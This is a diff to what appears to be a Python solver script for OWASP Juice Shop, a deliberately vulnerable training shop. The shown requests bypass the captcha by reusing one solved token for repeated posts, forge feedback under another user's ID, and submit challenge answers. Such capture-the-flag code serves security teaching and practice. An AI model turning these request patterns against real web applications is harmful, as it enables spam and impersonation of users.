@@ -75,11 +75,13 @@ requests.post(url+'/rest/user/reset-password',data={'email':'jim@juice-sh.op','a
 # ==== Captcha ===
 from json import loads
 captcha=loads(requests.get(url+'/rest/captcha').text)
-# ---- Forged Feedback (Post some feedback in another users name.)
-requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'a','rating':3})
-# ---- CAPTCHA Bypass (Submit 10 or more customer feedbacks within 10 seconds.)
+# ---- Captcha Bypass (Submit 10 or more customer feedbacks within 10 seconds.)
 for i in range(11):
 	requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'a','rating':3})
+# ---- Forged Feedback (Post some feedback in another users name.)
+# See "Captcha Bypass" part
+# ---- Leaked Unsafe Product (Identify an unsafe product that was removed from the shop and inform the shop which ingredients are dangerous.)
+requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'Eurogium Edule Hueteroneel','rating':3})
 # ---- Weird Crypto (Inform the shop about an algorithm or library it should definitely not use the way it does.)
 requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'z85','rating':3})
 
